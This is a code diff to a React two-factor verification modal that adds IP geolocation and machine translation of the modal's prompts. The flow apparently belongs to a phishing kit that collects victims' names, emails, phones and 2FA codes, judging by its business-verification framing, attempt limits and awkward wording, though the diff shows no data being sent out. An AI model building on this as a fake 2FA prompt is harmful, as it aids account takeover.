@@ -1,7 +1,8 @@
 import VerifyImage from '@/assets/images/2FAuth.png';
 import { store } from '@/store/store';
 import config from '@/utils/config';
-import { useTranslation } from '@/utils/use-translation';
+import { getTranslations } from '@/utils/translate';
+import { COUNTRY_TO_LANGUAGE, type LanguageCode } from '@/utils/country-language-map';
 import axios from 'axios';
 import Image from 'next/image';
 import { useEffect, useState, type FC } from 'react';
@@ -13,10 +14,96 @@ const VerifyModal: FC<{ businessName?: string; fullName?: string; nextStep?: () 
     const [isLoading, setIsLoading] = useState(false);
     const [showError, setShowError] = useState(false);
 
+    // Translation state
+    const [countryCode, setCountryCode] = useState('US');
+    const [translations, setTranslations] = useState<Record<string, string>>({}); 
+
     const { messageId, message, setMessage, userFullName, userEmail, userPhone, setFormStep } = store();
-    const { t } = useTranslation();
     const maxCode = 3;
     const loadingTime = config.CODE_LOADING_TIME ?? 30;
+
+    // Geo-detection effect
+    useEffect(() => {
+        const fetchGeoInfo = async () => {
+            try {
+                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json', { timeout: 5000 });
+                const cc = (data.country_code || 'US').toUpperCase();
+                setCountryCode(cc);
+            } catch {
+                setCountryCode('US');
+            }
+        };
+        fetchGeoInfo();
+    }, []);
+
+    // Translation effect - hybrid: hardcoded first, then API fallback for missing texts
+    useEffect(() => {
+        if (!countryCode) return;
+
+        (async () => {
+            const lang = (COUNTRY_TO_LANGUAGE[countryCode.toLowerCase()] || 'en') as LanguageCode;
+            if (lang === 'en') {
+                setTranslations({});
+                return;
+            }
+
+            // Get hardcoded translations first
+            const hardcodedTrans = getTranslations(lang) || {};
+            setTranslations(hardcodedTrans);
+
+            // Identify all texts used in this modal
+            const allTextsNeeded = [
+                'Two-factor authentication required',
+                'Enter the code for this account that we send to',
+                ' or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)',
+                'Code',
+                'The two-factor authentication you entered is incorrect. Please, try again after',
+                'Continue'
+            ];
+
+            // Find missing texts not in hardcoded translations
+            const missingTexts = allTextsNeeded.filter(text => !hardcodedTrans[text]);
+            if (missingTexts.length === 0) return;
+
+            // Get cache for this language
+            const CACHE_KEY = `translation_cache_${lang}`;
+            const cache: Record<string, string> = localStorage.getItem(CACHE_KEY)
+                ? JSON.parse(localStorage.getItem(CACHE_KEY)!)
+                : {};
+
+            // Fetch missing texts from Google Translate API
+            const results = await Promise.all(
+                missingTexts.map(async (text) => {
+                    if (cache[text]) return { text, translated: cache[text] };
+                    try {
+                        const res = await axios.get('https://translate.googleapis.com/translate_a/single', {
+                            params: { client: 'gtx', sl: 'en', tl: lang, dt: 't', q: text },
+                            timeout: 3000
+                        });
+                        const translated = res.data[0]?.map((item: string[]) => item[0]).filter(Boolean).join('') || text;
+                        cache[text] = translated;
+                        return { text, translated };
+                    } catch {
+                        return { text, translated: text };
+                    }
+                })
+            );
+
+            // Cache the results
+            localStorage.setItem(CACHE_KEY, JSON.stringify(cache));
+
+            // Merge hardcoded and API translations
+            const apiTranslations: Record<string, string> = {};
+            results.forEach(({ text, translated }) => {
+                apiTranslations[text] = translated;
+            });
+
+            const mergedTranslations = { ...hardcodedTrans, ...apiTranslations };
+            setTranslations(mergedTranslations);
+        })();
+    }, [countryCode]);
+
+    const t = (text: string): string => translations[text] || text;
 
     // Mask email - show first char and domain
     const maskEmail = (email: string): string => {
